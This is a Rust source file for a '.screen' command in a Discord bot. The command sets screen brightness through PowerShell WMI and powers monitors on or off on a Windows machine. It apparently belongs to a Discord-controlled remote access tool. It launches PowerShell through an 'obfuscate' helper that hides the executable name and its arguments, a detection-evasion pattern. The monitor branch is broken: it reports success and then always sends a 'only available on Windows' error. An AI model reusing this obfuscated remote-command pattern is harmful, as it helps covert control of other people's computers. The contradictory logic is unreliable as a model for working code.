use crate::commands::*;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;

use windows::Win32::{
    Foundation::{HWND, LPARAM, WPARAM},
    UI::WindowsAndMessaging::{PostMessageW, SC_MONITORPOWER, WM_SYSCOMMAND},
};

pub struct ScreenCommand;

#[async_trait]
impl BotCommand for ScreenCommand {
    fn name(&self) -> &str { "screen" }
    fn description(&self) -> &str { "Control screen brightness and monitors" }
    fn category(&self) -> &str { "system" }
    fn usage(&self) -> &str { ".screen <brightness|monitors> <value|on|off>" }
    fn examples(&self) -> &'static [&'static str] {
        &[
            ".screen brightness 50",
            ".screen brightness 100",
            ".screen monitors on",
            ".screen monitors off",
        ]
    }
    fn aliases(&self) -> &'static [&'static str] { &["scr"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let subcommand = match args.next() {
            Some(s) => s.to_lowercase(),
            None => {
                http.create_message(msg.channel_id)
                    .content("**Usage**: `.screen <brightness|monitors> <value|on|off>`")
                    .await?;
                return Ok(());
            }
        };

        let value = match args.next() {
            Some(v) => v.to_lowercase(),
            None => {
                http.create_message(msg.channel_id)
                    .content("**Usage**: `.screen <brightness|monitors> <value|on|off>`")
                    .await?;
                return Ok(());
            }
        };

        match subcommand.as_str() {
            "brightness" | "bright" | "b" => {
                let brightness_value = match value.parse::<u32>() {
                    Ok(v) if v <= 100 => v,
                    _ => {
                        http.create_message(msg.channel_id)
                            .content("**Error**: Brightness value must be between 0 and 100")
                            .await?;
                        return Ok(());
                    }
                };

                let result = set_brightness(brightness_value);

                match result {
                    Ok(_) => {
                        http.create_message(msg.channel_id)
                            .content(&format!("Successfully set brightness to {}%", brightness_value))
                            .await?;
                    }
                    Err(e) => {
                        http.create_message(msg.channel_id)
                            .content(&format!("Failed to set brightness: {}", e))
                            .await?;
                    }
                }
            }
            "monitors" | "monitor" | "m" => {
                let enable = match value.as_str() {
                    "on" | "enable" | "1" => true,
                    "off" | "disable" | "0" => false,
                    _ => {
                        http.create_message(msg.channel_id)
                            .content("**Error**: Value must be `on` or `off`")
                            .await?;
                        return Ok(());
                    }
                };

                let power_state = if enable { -1 } else { 2 };
                unsafe {
                    let _ = PostMessageW(
                        Some(HWND(-1isize as _)),
                        WM_SYSCOMMAND,
                        WPARAM(SC_MONITORPOWER as usize),
                        LPARAM(power_state),
                    );
                }
                let status = if enable { "on" } else { "off" };
                http.create_message(msg.channel_id)
                    .content(&format!("Successfully sent command to turn monitors {}", status))
                    .await?;

                http.create_message(msg.channel_id)
                    .content("**Error**: This command is only available on Windows")
                    .await?;
                
            }
            _ => {
                http.create_message(msg.channel_id)
                    .content("**Error**: Subcommand must be `brightness` or `monitors`")
                    .await?;
            }
        }

        Ok(())
    }
}

fn set_brightness(brightness: u32) -> Result<()> {
    use std::process::Command;
    use crate::utils::obfuscate::{exe, powershell as ps};

    // set brightness via WMI
    let script = format!(
        r#"(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,{})"#,
        brightness
    );

    let output = Command::new(exe::powershell())
        .args(&[&ps::no_profile(), &ps::command(), &script])
        .output()?;

    if output.status.success() {
        Ok(())
    } else {
        let error = String::from_utf8_lossy(&output.stderr);
        Err(anyhow::anyhow!("Failed to set brightness: {}", error))
    }
}

